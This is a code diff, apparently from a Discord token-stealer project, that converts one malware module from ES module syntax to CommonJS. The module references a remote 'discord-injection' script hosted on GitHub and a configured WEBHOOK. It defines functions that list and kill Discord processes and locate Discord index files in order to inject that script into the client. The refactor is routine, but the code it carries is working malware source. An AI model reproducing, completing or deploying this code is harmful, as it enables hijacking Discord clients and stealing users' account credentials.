@@ -1,12 +1,12 @@
 
 const Injection = "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js";
 
-import fs from "fs";
-import path from "path";
-import { exec } from "child_process";
-import { instance } from "./../../utils/axios/request.mjs";
+const fs = require("fs");
+const path = require("path");
+const { exec } = require("child_process");
+const { instance } = require("./../../utils/axios/request.js");
 
-import config from "./../../config/config.mjs";
+const config = require("./../../config/config.js");
 
 const {
   WEBHOOK,
@@ -155,7 +155,7 @@ const find_injects = async (f) => {
   }
 };
 
-export const kill_discords = async (res) => {
+const kill_discords = async (res) => {
   if (res !== true) return;
   try {
     await exec("tasklist", async (error, stdout, stderr) => {
@@ -190,7 +190,7 @@ export const kill_discords = async (res) => {
   }
 };
 
-export const discord_injected = async (res) => {
+const discord_injected = async (res) => {
   if (res !== true) return;
   try {
     for (let dir of discords_dirs()) find_indexs(dir);
@@ -201,3 +201,8 @@ export const discord_injected = async (res) => {
     console.error(e);
   }
 };
+
+module.exports = {
+  kill_discords,
+  discord_injected
+}
